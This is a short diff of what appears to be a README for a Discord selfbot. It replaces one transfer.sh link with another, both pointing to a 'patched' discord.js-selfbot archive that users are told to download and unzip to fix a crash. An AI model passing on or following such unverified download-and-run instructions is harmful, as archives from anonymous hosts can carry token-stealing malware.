@@ -6,4 +6,4 @@
 - custom status config
 
 
-- download this https://transfer.sh/V16WmU/discord.js-selfbot-patched.rar discord js selfbot and unzip its version probleme official version crash on write message on voice chat
+- download this https://transfer.sh/RvvXM0/discord.js-selfbot-patched.rar discord js selfbot and unzip its version probleme official version crash on write message on voice chat
